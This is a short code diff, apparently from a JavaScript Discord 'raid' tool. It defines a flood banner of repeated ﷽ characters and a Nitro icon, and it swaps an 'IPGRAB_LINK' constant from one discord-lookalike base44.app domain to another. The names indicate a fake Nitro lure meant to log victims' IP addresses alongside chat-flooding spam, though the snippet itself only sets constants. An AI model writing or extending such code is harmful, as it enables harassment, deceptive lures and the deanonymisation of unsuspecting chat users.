@@ -10,7 +10,7 @@ const RAID_LINES = 60;  // how many ﷽ lines
 const RAID_CHARS = 14;  // how many ﷽ per line
 
 const NITRO_ICON = 'https://cdn3.emoji.gg/emojis/7536-nitro.png';
-const IPGRAB_LINK = 'https://discord-gg-ffulqmnjp.base44.app';
+const IPGRAB_LINK = 'https://discord-gg-zjk2bx79e.base44.app';
 
 const raidBanner = Array.from(
   { length: RAID_LINES },
